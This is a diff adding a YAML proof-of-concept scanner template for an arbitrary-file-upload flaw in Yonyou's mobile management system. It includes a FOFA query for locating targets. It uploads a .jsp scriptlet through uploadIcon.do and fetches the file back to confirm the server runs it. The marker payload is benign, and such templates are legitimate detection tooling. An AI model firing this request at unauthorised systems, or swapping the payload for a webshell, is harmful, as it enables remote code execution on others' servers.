@@ -1,0 +1,39 @@
+id: poc-yaml-yongyou-yidong-manager-system-uploadicondo-anyfile-upload
+info:
+  name: 用友 移动管理系统 uploadIcon.do 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友 移动管理系统
+  fofa: app="用友-移动系统管理"
+variables:
+  filename: random_str(6)
+  content: random_str(32)
+requests:
+- method: POST
+  path: /maportal/appmanager/uploadIcon.do
+  headers:
+    Content-Type: multipart/form-data; boundary=b4e8eb7e0392a9158c610b1875784406
+  data: '--b4e8eb7e0392a9158c610b1875784406
+
+    Content-Disposition: form-data; name="iconFile"; filename="{{.filename}}.jsp"
+
+
+    <% out.println("{{.content}}"); %>
+
+    --b4e8eb7e0392a9158c610b1875784406--
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"status")
+
+    '
+- method: GET
+  path: /maupload/img/{{.filename}}.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,content)
+
+    '
+transport: http
